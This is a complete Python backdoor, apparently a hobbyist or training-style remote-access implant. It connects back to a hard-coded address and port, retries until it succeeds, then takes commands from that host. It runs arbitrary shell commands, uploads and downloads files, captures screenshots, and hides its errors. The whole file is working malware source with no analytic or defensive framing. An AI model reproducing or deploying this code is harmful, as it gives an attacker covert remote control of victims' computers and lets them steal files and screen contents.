import socket
import subprocess
import json
import sys
import os
import time
import pyautogui


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip = ip
        self.port = port
        self.connect()

    def connect(self):
        while True:
            try:
                self.connection.connect((self.ip, self.port))
                break
            except Exception:
                time.sleep(20)

    def screenshot(self):
        screen = pyautogui.screenshot()
        screen.save('scr.png')

    def command_exec(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).rstrip()

    def send_data(self, data):
        try:
            json_data = json.dumps(data.decode("ISO-8859-1"))
            self.connection.send(json_data.encode("ISO-8859-1"))
        except Exception:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode("ISO-8859-1"))

    def receive_data(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode("ISO-8859-1")
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, name, data):
        with open(name, 'wb') as file:
            file.write(data.encode("ISO-8859-1"))
            return 'File downloaded successfully'

    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return file.read()
        except Exception:
            return ''

    def run(self):
        while True:
            command = self.receive_data()
            data = None

            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()

                elif command[0] == 'download':
                    file = self.read_file(command[1])
                    data = file

                elif command[0] == 'upload':
                    self.write_file(command[1], command[2])
                    data = 'Uploaded succesfully'

                elif command[0] == 'screenshot':
                    self.screenshot()
                    data = self.read_file('scr.png')
                    os.remove('scr.png')

                elif command[0] == 'cd' and len(command) > 1:
                    os.chdir(command[1])
                    data = f'Directory has been changed to {os.getcwd()}'

                else:
                    data = self.command_exec(command)

            except Exception as exc:
                data = f'Error during command execution: {exc}'

            self.send_data(data)


if __name__ == '__main__':
    try:
        process = Backdoor('192.168.31.151', 6666)
        process.run()
    except Exception:
        sys.exit()
